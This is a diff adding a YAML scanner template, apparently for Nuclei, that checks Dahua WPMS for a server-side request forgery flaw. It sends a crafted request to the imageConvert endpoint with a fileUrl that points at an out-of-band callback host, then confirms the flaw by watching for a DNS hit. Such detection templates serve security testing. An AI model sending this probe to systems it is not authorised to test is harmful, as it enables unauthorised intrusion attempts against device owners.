@@ -1,0 +1,31 @@
+id: dahua-wpms-image-ssrf
+
+info:
+  name: dahua-wpms-image-ssrf
+  author: dahua-wpms-image-ssrf
+
+
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+
+
+requests:
+  - raw:
+      - |
+        GET /ipms/imageConvert/image?fileUrl=http://{{interactsh-url}}/{{filename}}.jpg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
